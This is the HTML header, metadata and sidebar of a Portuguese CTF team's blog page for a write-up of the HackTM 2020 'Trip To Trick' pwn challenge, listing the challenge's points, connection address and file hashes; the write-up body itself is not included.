<!DOCTYPE html>
<html lang=en>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000">
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top">
  
  
  <title>[Pwn] HackTM 2020 - Trip To Trick | TeamRocketIST - Portuguese CTF Team</title>
  <meta name="description" content="Trip To Trick      Description:492 Points    Author:NextLineFlag Path: /home/pwn/flag nc 138.68.67.161 20006 trip_to_trick c6fd4ef7c34c528668edd62914a79602 libc.so.6 2fb0d6800d4d79ffdc7a388d7fe6aea0">
<meta name="keywords" content="file_stream,io_file,io_file_struct,hacktm2020">
<meta property="og:type" content="article">
<meta property="og:title" content="[Pwn] HackTM 2020 - Trip To Trick">
<meta property="og:url" content="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/index.html">
<meta property="og:site_name" content="TEAMROCKETIST">
<meta property="og:description" content="Trip To Trick      Description:492 Points    Author:NextLineFlag Path: /home/pwn/flag nc 138.68.67.161 20006 trip_to_trick c6fd4ef7c34c528668edd62914a79602 libc.so.6 2fb0d6800d4d79ffdc7a388d7fe6aea0">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.imgur.com/NjshmMi.png">
<meta property="og:image" content="https://i.imgur.com/leh8S9p.png">
<meta property="og:image" content="https://i.imgur.com/odMGD5L.png">
<meta property="og:image" content="https://i.imgur.com/NMxH0uq.png">
<meta property="og:image" content="https://i.imgur.com/fuZATDk.png">
<meta property="og:image" content="https://i.imgur.com/4og8ZFu.png">
<meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[Pwn] HackTM 2020 - Trip To Trick">
<meta name="twitter:description" content="Trip To Trick      Description:492 Points    Author:NextLineFlag Path: /home/pwn/flag nc 138.68.67.161 20006 trip_to_trick c6fd4ef7c34c528668edd62914a79602 libc.so.6 2fb0d6800d4d79ffdc7a388d7fe6aea0">
<meta name="twitter:image" content="https://i.imgur.com/NjshmMi.png">
  <!-- Canonical links -->
  <link rel="canonical" href="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/index.html">
  
    <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
  
  
    <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
  
  <link rel="stylesheet" href="/css/style.css">
  
  
  
    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
  
  
</head>


<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
